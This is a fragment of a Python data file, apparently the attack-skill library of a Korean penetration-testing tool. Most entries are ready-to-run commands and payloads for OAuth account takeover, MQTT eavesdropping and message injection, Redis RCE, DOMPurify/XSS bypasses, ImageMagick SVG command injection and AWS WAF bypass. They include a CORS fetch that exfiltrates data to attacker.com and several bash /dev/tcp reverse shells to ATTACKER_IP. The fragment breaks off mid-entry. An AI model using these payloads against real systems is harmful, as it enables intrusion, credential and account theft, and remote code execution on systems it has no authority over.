    ),
},

# ══════════════════════════════════════════════════════════════
# api-unauth-fuzz — API 비인증 퍼징 스킬
# ══════════════════════════════════════════════════════════════

"skill-api-unauth-fuzz": {
    "name": "API 비인증 퍼징 스킬 (api-unauth-fuzz)",
    "module": "Skill-APIFuzz",
    "tags": ["api", "unauthenticated", "fuzzing", "endpoint-discovery"],
    "desc": "인증 없는 API 엔드포인트 자동 탐지 및 민감 데이터 노출 퍼징",
    "tools": ["ffuf", "burpsuite", "nuclei"],
    "commands": [
        # API 엔드포인트 발견
        "ffuf -u https://target.com/api/FUZZ -w api-endpoints.txt -mc 200,201,400,401,403",
        "ffuf -u https://target.com/FUZZ -w api-v1-v2.txt  # 버전 탐지",
        # 비인증 접근 테스트
        "curl -X GET https://target.com/api/v1/users  # Authorization 헤더 없이",
        "curl -X GET https://target.com/api/v1/admin",
        "curl -X GET https://target.com/api/v1/config",
        # HTTP 메서드 퍼징
        "ffuf -u https://target.com/api/v1/users -X FUZZ -w methods.txt",
        # 비인증 민감 엔드포인트
        "nuclei -u https://target.com -t exposures/apis/",
    ],
    "payloads": [
        "GET /api/v1/users (Authorization 없음)",
        "GET /api/v1/admin/users (IDOR)",
        "DELETE /api/v1/users/1 (비인증 삭제 시도)",
    ],
    "notes": (
        "비인증 API 체크: 1.swagger/openapi.json 노출 2.OPTIONS 메서드로 허용 목록 확인 "
        "3.401→200 변화 탐지 4.API 버전 다운그레이드 (v2→v1). "
        "민감 엔드포인트: /api/users, /api/admin, /api/config, /api/keys, /api/debug"
    ),
},

# ══════════════════════════════════════════════════════════════
# pentest-boundary — 모의해킹 범위/권한 관리
# ══════════════════════════════════════════════════════════════

"skill-pentest-boundary": {
    "name": "모의해킹 범위 및 권한 관리 (pentest-boundary)",
    "module": "Skill-PentestBoundary",
    "tags": ["scope", "authorization", "rate-control", "emergency"],
    "desc": "허가 범위 확인, 속도 제한, 비상 대응, 보안 서약 이행",
    "tools": [],
    "commands": [
        # 범위 확인 체크리스트
        "# 1. 타겟 도메인/IP 범위 명시적 확인",
        "# 2. 허가된 공격 유형 명확화 (읽기전용 vs 전체)",
        "# 3. 시간 범위 확인 (업무시간/야간)",
        "# 4. 속도 제한 설정 (DoS 방지)",
        "# 5. 비상 연락처 확보",
        # 속도 제한
        "nmap -T2 --scan-delay 1s  # 느린 스캔",
        "ffuf -rate 10 -t 5         # 초당 10요청",
        "sqlmap --delay 2           # 2초 지연",
        # 긴급 중단
        "# 서비스 장애 발생시 즉시 중단 후 담당자 연락",
        "# 의도치 않은 데이터 접근시 스크린샷 후 보고",
    ],
    "payloads": [],
    "notes": (
        "Bingo 철칙: 추가/수정/삭제 절대 불가. 읽기/추출만 허용. "
        "속도 제한: 실서비스 영향 최소화 위해 요청 속도 낮게 설정. "
        "비상 상황: 의도치 않은 서비스 중단, 실데이터 수정, 범위 이탈 → 즉시 중단+보고. "
        "증거 보관: 모든 발견사항 스크린샷+로그 보관"
    ),
},

# ══════════════════════════════════════════════════════════════
# skill-evolver — 스킬 자동 진화/업데이트 시스템
# ══════════════════════════════════════════════════════════════

"skill-evolver": {
    "name": "스킬 자동 진화 시스템 (skill-evolver)",
    "module": "Skill-Evolution",
    "tags": ["skill-evolution", "fp-reduction", "technique-db", "gap-analysis"],
    "desc": "스킬 생명주기 관리: 격차 분석→FP 감소→기법 DB→진화 로그",
    "tools": ["bingo"],
    "commands": [
        "bingo skill update     # GitHub에서 최신 스킬 동기화",
        "bingo skill list       # 전체 스킬 목록",
        "bingo skill search <keyword>  # 스킬 검색",
        "bingo skill show <id>  # 스킬 상세 보기",
    ],
    "payloads": [],
    "notes": (
        "스킬 격차 분석: 새로운 CVE/기법 등장시 skill_id 추가. "
        "FP 감소: 잘못된 탐지 패턴은 false-positives.db.md에 기록. "
        "기법 DB: 새로운 우회 기법은 techniques.db.md에 축적. "
        "진화 로그: evolution-log.md에 변경 이력 기록"
    ),
},

# ── v3.2.65 ──────────────────────────────────────────────────────────────────
"sec-web-oauth-open-reg": {
    "name": "OAuth 오픈 클라이언트 등록 → 체인 계정 탈취",
    "module": "SecSkills-Web",
    "tags": ["oauth", "auth-bypass", "account-takeover", "pkce", "cors", "open-registration"],
    "desc": (
        "/.well-known/oauth-authorization-server → registration_endpoint 발견 → "
        "미인증 클라이언트 등록 → redirect_uri 조작 → 인증 코드 탈취 → "
        "PKCE 우회 → 와일드카드 CORS 악용 → 계정 탈취 완전 체인"
    ),
    "tools": ["curl", "burpsuite", "python3"],
    "commands": [
        # Step 1: 디스커버리 — OAuth 메타데이터 엔드포인트 탐지
        "curl -s https://TARGET/.well-known/oauth-authorization-server | python3 -m json.tool",
        "curl -s https://TARGET/.well-known/openid-configuration | python3 -m json.tool",
        "# registration_endpoint 키 존재 여부 확인",

        # Step 2: 미인증 클라이언트 등록 (Open Dynamic Client Registration)
        "curl -s -X POST https://TARGET/oauth/register \\"
        "  -H 'Content-Type: application/json' \\"
        "  -d '{\"client_name\":\"poc\",\"redirect_uris\":[\"https://attacker.com/cb\"]}' \\"
        "  | python3 -m json.tool",
        "# client_id / client_secret 응답 확인 (인증 없이 등록되면 취약)",

        # Step 3: 공격자 redirect_uri로 인가 코드 요청
        "# 브라우저에서 피해자가 아래 URL 방문하도록 유도",
        "# https://TARGET/oauth/authorize"
        "?client_id=ATTACKER_CLIENT_ID"
        "&redirect_uri=https%3A%2F%2Fattacker.com%2Fcb"
        "&response_type=code"
        "&scope=openid+profile+email"
        "&state=csrf_token_here",

        # Step 4: 인가 코드 교환 (PKCE 없이 가능한 경우)
        "curl -s -X POST https://TARGET/oauth/token \\"
        "  -H 'Content-Type: application/x-www-form-urlencoded' \\"
        "  -d 'grant_type=authorization_code"
        "&code=AUTH_CODE_FROM_CALLBACK"
        "&redirect_uri=https://attacker.com/cb"
        "&client_id=ATTACKER_CLIENT_ID"
        "&client_secret=ATTACKER_CLIENT_SECRET'",

        # Step 5: PKCE 우회 확인 (code_verifier 없이 교환 시도)
        "# PKCE 강제 여부 확인 — code_challenge 없이 /authorize 통과되면 취약",
        "curl -s -X POST https://TARGET/oauth/token \\"
        "  -d 'grant_type=authorization_code&code=CODE&redirect_uri=...&client_id=...'",

        # Step 6: 와일드카드 CORS 악용 (토큰 API에서 CORS 헤더 확인)
        "curl -s -I -X OPTIONS https://TARGET/api/me \\"
        "  -H 'Origin: https://attacker.com' \\"
        "  -H 'Access-Control-Request-Method: GET'",
        "# Access-Control-Allow-Origin: * + Access-Control-Allow-Credentials: true → CORS 취약",

        # Step 7: 탈취한 액세스 토큰으로 계정 정보 조회
        "curl -s https://TARGET/api/me -H 'Authorization: Bearer ACCESS_TOKEN'",
        "curl -s https://TARGET/api/profile -H 'Authorization: Bearer ACCESS_TOKEN'",

        # 보조 자동화 스크립트 (bash+curl)
        "curl -sk -m 10 -X POST 'https://TARGET/oauth/register' "
        "-H 'Content-Type: application/json' "
        "-d '{\"client_name\":\"poc\",\"redirect_uris\":[\"https://attacker.com/cb\"]}' "
        "| python3 -c \"import json,sys; print(json.dumps(json.loads(sys.stdin.read()), indent=2))\"",
    ],
    "payloads": [
        # 미인증 클라이언트 등록 페이로드
        '{"client_name":"poc","redirect_uris":["https://attacker.com/cb"],'
        '"grant_types":["authorization_code"],"response_types":["code"]}',
        # redirect_uri 조작 변형
        "redirect_uri=https://attacker.com/cb",
        "redirect_uri=https://TARGET.attacker.com/cb",
        "redirect_uri=https://attacker.com%2540TARGET/cb",
        # CORS PoC (브라우저 실행용)
        "<script>fetch('https://TARGET/api/me',{credentials:'include'})"
        ".then(r=>r.text()).then(d=>fetch('https://attacker.com/?d='+btoa(d)))</script>",
    ],
    "notes": (
        "[체인 구조] "
        "1) /.well-known/oauth-authorization-server → registration_endpoint 노출 "
        "2) 인증 없이 클라이언트 등록 가능 (Open Dynamic Client Registration) "
        "3) 등록된 attacker client_id로 피해자 인가 흐름 시작 "
        "4) redirect_uri 조작 → 인가 코드가 attacker.com으로 전달 "
        "5) PKCE 미강제 → code_verifier 없이 토큰 교환 성공 "
        "6) 와일드카드 CORS → JS에서 직접 API 크로스오리진 읽기 가능 "
        "7) 액세스 토큰/JWT → 피해자 계정 완전 탈취. "
        "[탐지 포인트] "
        "registration_endpoint 인증 필요 여부, "
        "redirect_uri 화이트리스트 엄격 검사, "
        "PKCE (code_challenge_method=S256) 강제, "
        "CORS: Credentials+Wildcard 동시 허용 금지, "
        "토큰 audience/issuer 검증. "
        "[레퍼런스] RFC 7591 (Dynamic Client Registration), "
        "OAuth 2.0 Security BCP (RFC 9700), "
        "OWASP API Security — Broken Authentication"
    ),
},

# ── OAuth 이메일 미검증 → 수백만 계정 탈취 (v3.2.66) ──────────────────────────
"sec-web-oauth-email-unverified-ato": {
    "name": "OAuth 이메일 미검증 ATO / Unverified Email Account Takeover",
    "module": "SecSkills-Web",
    "tags": ["oauth", "account-takeover", "email-unverified", "identity-provider",
             "social-login", "auth-bypass", "critical"],
    "desc": (
        "OAuth/OIDC 제공자(provider)가 이메일 검증 없이 계정을 생성할 때 발생하는 "
        "Critical ATO 취약점. "
        "공격자는 피해자 이메일로 자신의 IdP 계정을 만들고 → "
        "타겟 사이트에서 'Sign in with [IdP]'로 로그인 → "
        "이메일 기반 계정 연동이 자동으로 피해자 계정에 연결 → 완전 탈취. "
        "영향 범위: 해당 IdP를 Social Login으로 사용하는 모든 사이트 수백만 계정."
    ),
    "tools": ["burpsuite", "curl", "python3", "disposable-email"],
    "commands": [
        # Step 1: 타겟 사이트의 Social Login 제공자 목록 파악
        "# 1) 로그인 페이지에서 'Sign in with X/Y/Z' 버튼 목록 수집",
        "curl -s https://TARGET/login | grep -i 'oauth\\|social\\|google\\|github\\|apple'",

        # Step 2: IdP 계정 생성 — 이메일 미검증 확인
        "# 2) 대상 IdP에서 피해자 이메일로 계정 생성 (이메일 소유 증명 없이 가능한지 테스트)",
        "# 예: provider.com/register → email=victim@example.com → 인증 이메일 없이 계정 생성",
        "curl -s -X POST https://PROVIDER/api/register \\"
        "  -H 'Content-Type: application/json' \\"
        "  -d '{\"email\":\"victim@target.com\",\"password\":\"Attacker123!\"}'",
        "# 이메일 인증 없이 201/200 응답 → 취약",

        # Step 3: 미검증 계정으로 타겟 사이트 OAuth 로그인 시도
        "# 3) 타겟 사이트에서 'Sign in with [PROVIDER]' 클릭 → OAuth flow 시작",
        "# IdP access_token / id_token 획득",
        "curl -s -X POST https://PROVIDER/oauth/token \\"
        "  -d 'grant_type=password&username=victim@target.com"
        "&password=Attacker123!&client_id=CLIENT_ID'",

        # Step 4: 타겟 사이트 OAuth 콜백으로 토큰 전달
        "# 4) 타겟 사이트 /auth/callback?code=... 로 인가 코드 전달",
        "curl -s 'https://TARGET/auth/callback' \\"
        "  --cookie 'state=CSRF_TOKEN' \\"
        "  -G --data-urlencode 'code=OAUTH_CODE' \\"
        "  --data-urlencode 'state=CSRF_TOKEN'",
        "# email_verified: false 필드를 타겟이 확인하지 않으면 → 피해자 계정으로 로그인 성공",

        # Step 5: email_verified 클레임 수동 확인
        "# 5) id_token JWT 디코딩 → email_verified 필드 확인",
        "python3 -c \""
        "import base64, json; "
        "tok='ID_TOKEN_HERE'; "
        "pad=tok.split('.')[1]+'=='; "
        "print(json.loads(base64.urlsafe_b64decode(pad)))\"",
        "# email_verified: false 이면서 타겟이 검증 안 하면 → CRITICAL ATO",

        # Step 6: 영향 범위 확인
        "# 6) 동일 IdP를 사용하는 다른 서비스 목록화",
        "curl -sk -m 10 'https://TARGET/api/me' -H 'Cookie: session=ATTACKER_SESSION' "
        "| python3 -c \"import json,sys; print(json.dumps(json.loads(sys.stdin.read()), indent=2))\"",
    ],
    "payloads": [
        # 이메일 미검증 계정 생성
        '{"email":"victim@target.com","password":"Attacker123!","skip_verification":true}',
        # id_token email_verified 조작 시도 (none alg attack과 결합)
        '{"sub":"attacker_sub","email":"victim@target.com","email_verified":true}',
        # Social login 콜백 파라미터
        "code=STOLEN_AUTH_CODE&state=VALID_CSRF",
    ],
    "notes": (
        "[공격 체인] "
        "1) 취약 IdP에서 피해자 이메일로 미검증 계정 생성 "
        "2) 해당 IdP로 타겟 사이트 OAuth 로그인 시도 "
        "3) 타겟이 email_verified: false 클레임 무시 → 이메일로 계정 매칭 "
        "4) 피해자 계정에 공격자 세션 → ATO 완성. "
        "[핵심 포인트] "
        "이 버그의 심각성은 '규모': 해당 IdP가 OAuth provider이면 연동된 모든 서비스에 적용. "
        "구글/깃허브/애플처럼 대형 IdP가 취약하면 수억 계정 영향. "
        "[확인 항목] "
        "id_token.email_verified 클레임 검증 여부, "
        "계정 생성 시 이메일 소유 증명 요구 여부, "
        "이메일로 계정 자동 연결(account linking) 정책. "
        "[레퍼런스] "
        "Ali Mojaver - 'The Most Dangerous OAuth Bug I've Ever Found', "
        "OpenID Connect Core §5.1 (email_verified claim), "
        "OAuth 2.0 Security BCP RFC 9700"
    ),
},

# ── IoT MQTT 브로커 자격증명 탈취 (v3.2.66) ───────────────────────────────────
"sec-iot-mqtt-credential-leak": {
    "name": "IoT MQTT 브로커 자격증명 탈취 / MQTT Credential Exposure",
    "module": "SecSkills-IoT",
    "tags": ["mqtt", "iot", "credential-leak", "chatbot", "live-chat",
             "hardcoded-creds", "broker", "websocket"],
    "desc": (
        "챗봇·라이브채팅·IoT 서비스의 프론트엔드 JS/HTML에서 "
        "MQTT 브로커 자격증명(host, port, username, password)이 하드코딩된 취약점. "
        "공격자는 클라이언트 소스 코드를 분석하여 MQTT 브로커에 직접 연결, "
        "모든 토픽의 메시지를 구독·발행하여 대화 내용 도청, "
        "관리 메시지 조작, 다른 사용자 세션 탈취까지 가능."
    ),
    "tools": ["mosquitto", "mqttx", "burpsuite", "browser-devtools", "mqtt-spy"],
    "commands": [
        # Step 1: 클라이언트 소스에서 MQTT 자격증명 추출
        "# 1) 페이지 소스 / JS 번들에서 MQTT 설정 검색",
        "curl -s https://TARGET/ | grep -iE 'mqtt|1883|8883|websocket.*ws://'",
        "# 또는 브라우저 DevTools → Sources → 'mqtt' / 'broker' / 'password' 검색",

        # Step 2: JS 파일에서 하드코딩된 자격증명 추출
        "# 2) JS 번들 다운로드 후 자격증명 검색",
        "curl -s https://TARGET/static/js/main.chunk.js \\"
        "  | grep -oE '(mqtt_?pass(word)?|broker_?pass)[^,\"}]+'",
        "curl -s https://TARGET/static/js/main.chunk.js \\"
        "  | python3 -c \""
        "import sys, re; "
        "src = sys.stdin.read(); "
        "print(re.findall(r'(?:password|passwd|pwd)\\s*[=:]\\s*[\\'\\\"]([^\\'\\\"]+)', src))\"",

        # Step 3: 추출된 자격증명으로 MQTT 브로커 연결
        "# 3) mosquitto_sub으로 전체 토픽 구독",
        "mosquitto_sub -h BROKER_HOST -p 1883 \\"
        "  -u 'EXTRACTED_USER' -P 'EXTRACTED_PASS' \\"
        "  -t '#' -v",
        "# -t '#' = 모든 토픽 구독 (와일드카드)",

        # Step 4: WebSocket을 통한 MQTT 연결 (브라우저 기반)
        "# 4) WebSocket MQTT (포트 9001 등)",
        "mqttx sub -h BROKER_HOST -p 9001 \\"
        "  --protocol ws \\"
        "  -u 'EXTRACTED_USER' -P 'EXTRACTED_PASS' \\"
        "  -t '#'",

        # Step 5: 메시지 조작 (발행)
        "# 5) 다른 사용자 대화방에 메시지 주입",
        "mosquitto_pub -h BROKER_HOST -p 1883 \\"
        "  -u 'EXTRACTED_USER' -P 'EXTRACTED_PASS' \\"
        "  -t 'chat/USER_ID/messages' \\"
        "  -m '{\"sender\":\"support\",\"text\":\"비밀번호를 입력해 주세요\"}'",

        # Step 6: 관리 토픽 및 민감 정보 토픽 탐색
        "mosquitto_sub -h BROKER_HOST -p 1883 \\"
        "  -u 'EXTRACTED_USER' -P 'EXTRACTED_PASS' \\"
        "  -t '+/admin/#' -v",
        "mosquitto_sub -h BROKER_HOST -t '$SYS/#' -v  # 브로커 시스템 정보",

        # Step 7: Shodan에서 취약 MQTT 브로커 탐색
        "shodan search 'port:1883 product:Mosquitto' --fields ip_str,port,org",
    ],
    "payloads": [
        # JavaScript 패턴에서 MQTT 자격증명 추출용 정규식
        r"(?:mqtt_pass|broker_pass|mqttPassword)\s*[=:]\s*['\"]([^'\"]+)['\"]",
        r"new Paho\.MQTT\.Client\(['\"]([^'\"]+)['\"],\s*(\d+)",
        # 메시지 조작 페이로드
        '{"type":"message","userId":"VICTIM_ID","content":"Injected message"}',
        # 세션 탈취 페이로드 (chat token)
        '{"type":"auth","token":"ATTACKER_TOKEN","hijack_session":"VICTIM_SESSION"}',
    ],
    "notes": (
        "[공격 흐름] "
        "1) 채팅/IoT 서비스 JS에서 MQTT 설정 (host/user/pass) 하드코딩 발견 "
        "2) mosquitto_sub -t '#'로 모든 사용자 실시간 대화 도청 "
        "3) 특정 사용자 토픽에 악성 메시지 발행 → 피싱/세션탈취 "
        "4) 관리자 토픽 접근 시 시스템 전체 제어 가능. "
        "[탐지 방법] "
        "JS 번들에서 mqtt/broker/password 키워드 grep, "
        "네트워크 탭에서 WebSocket ws:// 트래픽 캡처, "
        "MQTT 클라이언트로 브로커 직접 연결 시도. "
        "[레퍼런스] "
        "Lazy Sharaf - 'How I Hacked a Live Chatbot and Earned My First 4-Digit Bounty', "
        "MQTT Security Fundamentals, OWASP IoT Attack Surface Areas"
    ),
},

# ── Redis CVE-2026-23631 DarkReplica UAF→RCE (v3.2.66) ───────────────────────
"sec-infra-redis-cve-2026-23631": {
    "name": "Redis CVE-2026-23631 DarkReplica UAF→RCE",
    "module": "SecSkills-Infra",
    "tags": ["redis", "cve-2026-23631", "use-after-free", "rce", "replication",
             "post-auth", "uaf", "slaveof", "lua", "function"],
    "desc": (
        "Redis 복제(Replication) 서브시스템의 Use-After-Free 취약점 (CVE-2026-23631). "
        "Redis 7.0 ~ 7.2.x 버전에서 인증 후 SLAVEOF + FUNCTION 명령으로 "
        "UAF를 트리거, Lua 함수 등록을 통해 서버에서 임의 코드 실행. "
        "공격자는 Redis 인증 자격증명(기본값 없음 또는 약한 비밀번호) 획득 후 "
        "악성 '마스터' 서버로 타겟 Redis를 복제 연결시켜 RCE 달성."
    ),
    "tools": ["redis-cli", "python3", "nmap", "shodan"],
    "commands": [
        # Step 1: Redis 포트 탐지
        "# 1) Redis 서비스 탐지",
        "nmap -sV -p 6379,6380,6381 TARGET",
        "shodan search 'port:6379 product:Redis' --fields ip_str,port,version,org",

        # Step 2: 인증 없는 접근 시도
        "redis-cli -h TARGET -p 6379 ping",
        "redis-cli -h TARGET -p 6379 INFO server | grep redis_version",
        "# 인증 없이 PONG → 직접 익스플로잇 가능",

        # Step 3: 약한 비밀번호 브루트포스
        "# 3) 공통 Redis 비밀번호 시도",
        "for pass in '' 'redis' 'password' 'admin' '123456' 'root'; do "
        "  echo -n \"Trying '$pass': \"; "
        "  redis-cli -h TARGET -a \"$pass\" ping 2>/dev/null; "
        "done",

        # Step 4: 버전 확인 (취약 버전: 7.0~7.2.x)
        "redis-cli -h TARGET info server | grep -E 'redis_version|os|arch'",
        "# 취약 버전: 7.0.0 ~ 7.2.4 (7.2.5 패치됨)",

        # Step 5: CVE-2026-23631 UAF 트리거 — 악성 마스터 서버 준비
        "# 5) 공격자 서버에서 악성 Redis 마스터 설정 (RogueRedis)",
        "python3 -c \""
        "# 악성 마스터: 타겟이 복제 요청 시 조작된 RDB 스트림 전송",
        "# RedisGhost / DarkReplica PoC 도구 사용",
        "import subprocess; "
        "subprocess.run(['python3', 'dark_replica.py', '--lhost', 'ATTACKER_IP', '--lport', '6666'])\"",

        # Step 6: SLAVEOF 명령으로 타겟을 악성 마스터에 연결
        "redis-cli -h TARGET -a 'PASSWORD' SLAVEOF ATTACKER_IP 6666",
        "redis-cli -h TARGET -a 'PASSWORD' CONFIG SET dir /tmp",
        "redis-cli -h TARGET -a 'PASSWORD' CONFIG SET dbfilename 'shell.so'",

        # Step 7: FUNCTION LOAD로 Lua 악성 함수 등록 (UAF 트리거)
        "redis-cli -h TARGET -a 'PASSWORD' FUNCTION LOAD REPLACE \\"
        "  '#!lua name=malicious\\nredis.register_function(\"exec\","
        "function(k,a) return os.execute(a[1]) end)'",
        "redis-cli -h TARGET -a 'PASSWORD' FCALL exec 0 'id > /tmp/pwned'",
        "redis-cli -h TARGET -a 'PASSWORD' FCALL exec 0 \\"
        "  'bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"'",

        # Step 8: 리버스 셸 수신
        "nc -lvnp 4444",
    ],
    "payloads": [
        # SLAVEOF를 통한 악성 마스터 연결
        "SLAVEOF ATTACKER_IP 6666",
        # UAF 트리거 Lua 함수 페이로드
        "#!lua name=shell\nredis.register_function('sh',function(k,a)"
        " return os.execute(a[1]) end)",
        # CONFIG SET으로 crontab 쓰기 (인증 없는 경우 대안)
        "CONFIG SET dir /var/spool/cron/",
        "CONFIG SET dbfilename root",
        'SET cron "\\n* * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\\n"',
        "BGSAVE",
    ],
    "notes": (
        "[CVE-2026-23631 DarkReplica 요약] "
        "취약 버전: Redis 7.0.0 ~ 7.2.4 (7.2.5에서 패치). "
        "트리거: 인증 후 SLAVEOF → 악성 RDB 스트림 수신 → replication 서브시스템 UAF → "
        "heap corruption → FUNCTION LOAD와 결합 시 RCE. "
        "[전제 조건] "
        "Redis 인증 자격증명 필요 (인증 없는 경우 더 쉬움). "
        "공격자 통제 서버에서 악성 마스터 실행 필요. "
        "[완화] "
        "Redis 7.2.5+ 패치 적용, "
        "requirepass 강력한 비밀번호 설정, "
        "bind 127.0.0.1 (인터넷 노출 금지), "
        "rename-command SLAVEOF '', FUNCTION '' (위험 명령 비활성화). "
        "[레퍼런스] "
        "ZeroDay.cloud - 'Redis CVE-2026-23631 DarkReplica', "
        "NVD CVE-2026-23631, Redis Security Guide"
    ),
},


# ── v3.2.67 신규 스킬 ─────────────────────────────────────────────────────

"sec-web-dom-clobbering": {
    "name": "DOM Clobbering + DOMPurify Bypass → XSS",
    "module": "SecSkills-Web",
    "tags": ["dom-clobbering", "dompurify", "xss", "html-injection", "sanitizer-bypass",
             "javascript", "prototype", "client-side"],
    "desc": (
        "DOM Clobbering: HTML의 id/name 속성이 window/document 전역 프로퍼티를 덮어쓰는 특성 악용. "
        "DOMPurify 3.0.9 이하 버전은 id/name 속성을 제거하지 않아 DOM Clobbering 후속 XSS 가능. "
        "공격 체인: HTML 인젝션(id/name 속성) → 전역 변수 clobber → "
        "스크립트가 clobber된 변수를 href/src로 사용 → XSS. "
        "IDOR 등으로 HTML 인젝션 진입점을 확보한 뒤 연계 활용."
    ),
    "tools": ["burpsuite", "browser-devtools", "python3"],
    "commands": [
        "# 1) DOMPurify 버전 확인",
        "curl -s https://TARGET/static/js/app.js | grep -i 'dompurify\\|DOMPurify' | head -5",
        "# 2) DOM Clobbering 기본 페이로드 테스트",
        "# <a id=defaultView><a id=defaultView name=opener href=javascript:alert(1)>",
        "# <form id=x><input name=action value='javascript:alert(1)'>",
        "# 3) id/name 속성 DOMPurify 통과 여부 확인",
        "curl -sk -m 10 -X POST 'https://TARGET/api/comment' "
        "-H 'Content-Type: application/json' "
        "-d '{\"body\":\"<a id=x name=y href=javascript:void(0)>test</a>\"}' "
        "| python3 -c \"import sys; r=sys.stdin.read(); print('PASS' if 'id=x' in r else 'STRIP')\"",
        "# 4) 전역 변수 clobber → 스크립트 실행 컨텍스트 분석",
        "# 브라우저 콘솔: document.getElementById('x') → window.x 확인",
        "# 5) XSS 체인 완성: IDOR → HTML 삽입 → clobber → alert(document.cookie)",
    ],
    "notes": (
        "DOMPurify 3.0.10+ id/name 속성 필터링 강화. "
        "Trusted Types API로 DOM 변조 차단 권장. "
        "[레퍼런스] "
        "Intigriti CTF — IDOR+DOM Clobbering+DOMPurify 3.0.9 bypass 체인, "
        "PortSwigger — DOM Clobbering, "
        "GitHub DOMPurify Changelog 3.0.10"
    ),
},

"sec-web-dompurify-pp-bypass": {
    "name": "DOMPurify Bypass via Prototype Pollution + contenteditable",
    "module": "SecSkills-Web",
    "tags": ["dompurify", "prototype-pollution", "xss", "sanitizer-bypass",
             "javascript", "content-editable", "client-side"],
    "desc": (
        "Prototype Pollution(PP)으로 Object.prototype에 contentEditable=true 삽입 → "
        "DOMPurify의 isElement 체크를 우회하여 XSS 페이로드 통과. "
        "PP 취약 라이브러리(lodash.merge, jQuery.extend 등)와 DOMPurify 동시 사용 시 발생. "
        "contenteditable 속성이 허용리스트에 있어 삭제되지 않고 "
        "prototype 오염으로 임의 속성이 모든 엘리먼트에 주입됨."
    ),
    "tools": ["burpsuite", "browser-devtools", "python3"],
    "commands": [
        "# 1) Prototype Pollution 진입점 탐지",
        "curl -sk -m 10 'https://TARGET/api/config?__proto__[polluted]=1' "
        "| python3 -c \"import sys; print(sys.stdin.read()[:200])\"",
        "# 2) merge/extend 계열 함수 PP 테스트",
        "# POST /api/update {\"__proto__\":{\"isHTML\":true}} 응답 확인",
        "# 3) DOMPurify 버전 + PP 교차 테스트",
        "# payload: {\"__proto__\":{\"innerHTML\":\"<img src=x onerror=alert(1)>\"}}",
        "# 4) contenteditable 헤더 인젝션 체인",
        "# <div contenteditable><img src=x onerror=alert(document.domain)>",
        "curl -s -X POST https://TARGET/api/note \\"
        "  -H 'Content-Type: application/json' \\"
        "  -d '{\"__proto__\":{\"trusted\":true},\"content\":\"<img src=x onerror=alert(1)>\"}'",
    ],
    "notes": (
        "PP 방어: Object.freeze(Object.prototype) 또는 JSON.parse 사용. "
        "DOMPurify FORCE_BODY 옵션 + Trusted Types 병행 권장. "
        "[레퍼런스] "
        "labs.trace37.com — DOMPurify PP + contenteditable header bypass, "
        "PortSwigger — Prototype Pollution to XSS"
    ),
},

"sec-web-imagemagick-ghostscript-rce": {
    "name": "ImageMagick + Ghostscript SVG → RCE Chain",
    "module": "SecSkills-Web",
    "tags": ["imagemagick", "ghostscript", "rce", "svg", "mvg", "msl",
             "file-upload", "safer-bypass", "arbitrary-file-write"],
    "desc": (
        "SVG 파일에 CR(0x0D) 인젝션 → ImageMagick이 MIME 재탐지 시 MVG(Magick Vector Graphics)로 파싱 → "
        "MVG 내 push/pop graphic-context 조작으로 명령 실행. "
        "또는 MSL(Magick Scripting Language) 프로세서를 통해 임의 파일 쓰기. "
        "Ghostscript SAFER 모드: .tempfile 명령어 우회로 /tmp 쓰기 가능 → "
        "예측 가능한 파일명으로 RCE. "
        "단일 SVG 파일로 RCE 달성 가능한 고위험 체인."
    ),
    "tools": ["imagemagick", "convert", "python3", "burpsuite", "curl"],
    "commands": [
        "# 1) ImageMagick 버전 및 정책 확인",
        "convert --version",
        "cat /etc/ImageMagick-6/policy.xml | grep -E 'pattern|rights'",
        "# 2) MVG 인젝션 SVG 생성",
        "python3 -c \""
        "svg = '''<?xml version=\\\"1.0\\\"?>\\n"
        "<!DOCTYPE svg [\\n"
        "  <!ENTITY xxe SYSTEM \\\"mvg:///etc/ImageMagick/delegates.xml\\\">\\n"
        "]>\\n"
        "<svg>\\n"
        "  push graphic-context\\n"
        "  viewbox 0 0 640 480\\n"
        "  fill 'url(https://localhost/\\\");|id>/tmp/pwn;\\\"'\\n"
        "  pop graphic-context\\n"
        "</svg>'''; "
        "open('/tmp/payload.svg','w').write(svg); print('Written')\"",
        "# 3) 업로드 및 변환 트리거",
        "curl -s -F 'file=@/tmp/payload.svg' https://TARGET/api/upload",
        "curl -s https://TARGET/api/convert?format=png",
        "# 4) 파일 쓰기 확인",
        "curl -s https://TARGET/tmp/pwn",
        "# 5) MSL 경로를 통한 임의 파일 쓰기",
        "# convert 'msl:/tmp/evil.msl' /tmp/out.png",
    ],
    "notes": (
        "[완화] ImageMagick policy.xml에서 MVG/MSL/SVG 비활성화, "
        "Ghostscript -dSAFER -dNOWRITE 옵션 강제. "
        "[레퍼런스] "
        "blog.deephacking.tech — ImagePanick: From SVG to RCE (ImageMagick+Ghostscript), "
        "CVE-2016-3714 (ImageTragick)"
    ),
},

"sec-cloud-aws-alb-bypass": {
    "name": "AWS ALB CloudFront/WAF Bypass & Rule Shadowing",
    "module": "SecSkills-Cloud",
    "tags": ["aws", "alb", "cloudfront", "waf-bypass", "rule-shadowing",
             "ip-bypass", "load-balancer", "cloud-misconfig"],
    "desc": (
        "AWS Application Load Balancer(ALB) 미스컨피그로 CloudFront/WAF 우회. "
        "1) 직접 ALB 접근: CloudFront 없이 ALB DNS에 직접 요청 → WAF 룰 미적용. "
        "2) 룰 섀도잉: ALB 룰 우선순위 오류로 낮은 우선순위 룰이 높은 우선순위 룰을 덮어써 인증 우회. "
        "3) IP 게이트 우회: 보조 ALB를 통한 우회 경로. "
        "도구: ELBaph — ALB 공격 전용 자동화 도구."
    ),
    "tools": ["curl", "nmap", "python3", "ELBaph", "burpsuite", "dig"],
    "commands": [
        "# 1) ALB 직접 DNS 탐지 (CloudFront 우회)",
        "dig +short TARGET.com",
        "curl -sk -H 'Host: TARGET.com' https://ALB-DIRECT.REGION.elb.amazonaws.com/admin",
        "# 2) SPF 레코드에서 실제 ALB IP 확인",
        "dig TXT TARGET.com | grep include",
        "dig TXT _spf.TARGET.com",
        "# 3) Shodan에서 ALB 직접 노출 확인",
        "# shodan search 'ssl:TARGET.com http.title:\"ALB\"'",
        "# 4) ELBaph 도구로 ALB 공격 자동화",
        "# python3 elbapch.py --target TARGET.com --mode bypass",
        "# 5) 룰 섀도잉: 낮은 우선순위 룰 테스트",
        "curl -sk https://TARGET.com/admin -H 'X-Forwarded-For: 127.0.0.1'",
        "curl -sk https://TARGET.com/admin -H 'X-Original-URL: /public'",
        "# 6) WAF 우회 헤더 조합",
        "curl -sk https://ALB_IP/admin \\"
        "  -H 'Host: TARGET.com' \\"
